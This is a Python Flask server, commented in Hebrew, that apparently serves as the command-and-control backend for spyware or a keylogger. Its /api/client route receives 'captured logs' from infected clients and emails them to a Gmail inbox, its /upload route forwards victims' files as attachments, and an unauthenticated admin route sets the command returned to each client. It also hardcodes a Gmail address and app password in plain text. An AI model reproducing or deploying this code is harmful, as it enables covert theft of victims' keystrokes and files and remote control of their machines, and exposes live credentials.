import os
import smtplib
from flask import Flask, request, jsonify
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

app = Flask(__name__)

EMAIL_USER = "n77971507@gmail.com"
EMAIL_PASS = "kcfyrlwmuqqwvgil"

# משתנה לשמירת הפקודה הנוכחית בזיכרון
current_cmd = "OK"


def send_to_mail(subject, body, file_path=None):
    """פונקציה לשליחת מייל עם לוגים מפורטים"""
    print(f"[*] Starting email sequence to: {EMAIL_USER}")

    msg = MIMEMultipart()
    msg['From'] = EMAIL_USER
    msg['To'] = EMAIL_USER
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    if file_path:
        try:
            with open(file_path, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
                msg.attach(part)
            print(f"[*] Attached file: {file_path}")
        except Exception as e:
            print(f"[!] Attachment error: {e}")

    try:
        print("[*] Connecting to Google SMTP server...")
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # הצפנה

        print("[*] Attempting login...")
        server.login(EMAIL_USER, EMAIL_PASS)

        print("[*] Sending message...")
        server.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string())

        server.quit()
        print("[SUCCESS] Email was sent successfully!")
        return True
    except smtplib.SMTPAuthenticationError:
        print("[ERROR] Authentication failed! Check your App Password or Email.")
    except Exception as e:
        print(f"[ERROR] Something went wrong: {e}")
    return False


# --- נתיבי השרת ---

@app.route('/api/client', methods=['POST'])
def client_entry():
    global current_cmd

    # וידוא קבלת נתונים
    incoming_data = request.get_json()
    if not incoming_data:
        print("[!] Received empty POST request")
        return current_cmd, 200

    data = incoming_data.get("data", "")
    print(f"[*] Received data from client: {data[:50]}...")  # מדפיס רק את ההתחלה של הלוג

    if data:
        # שליחה למייל
        send_to_mail("New Logs Captured", f"Content recorded:\n\n{data}")

    # מחזיר ללקוח את הפקודה שמחכה לו
    return current_cmd, 200


@app.route('/upload', methods=['POST'])
def file_upload():
    if 'file' not in request.files:
        print("[!] Client tried to upload without a file")
        return "No file", 400

    f = request.files['file']
    path = os.path.join("/tmp", f.filename)
    f.save(path)
    print(f"[*] File saved temporarily: {path}")

    success = send_to_mail(f"File Received: {f.filename}", "Attached PDF file.", path)

    if os.path.exists(path):
        os.remove(path)
        print(f"[*] Temporary file removed: {path}")

    return "OK" if success else "Error", 200


@app.route('/api/admin/command', methods=['POST'])
def update_command():
    global current_cmd
    new_cmd = request.json.get("command")
    if new_cmd:
        current_cmd = new_cmd
        print(f"[ADMIN] Command updated to: {current_cmd}")
    return "Updated", 200


if __name__ == '__main__':
    # Render משתמש בפורט שמוגדר במשתני הסביבה
    port = int(os.environ.get("PORT", 5000))
    print(f"[*] Server starting on port {port}...")
    app.run(host='0.0.0.0', port=port)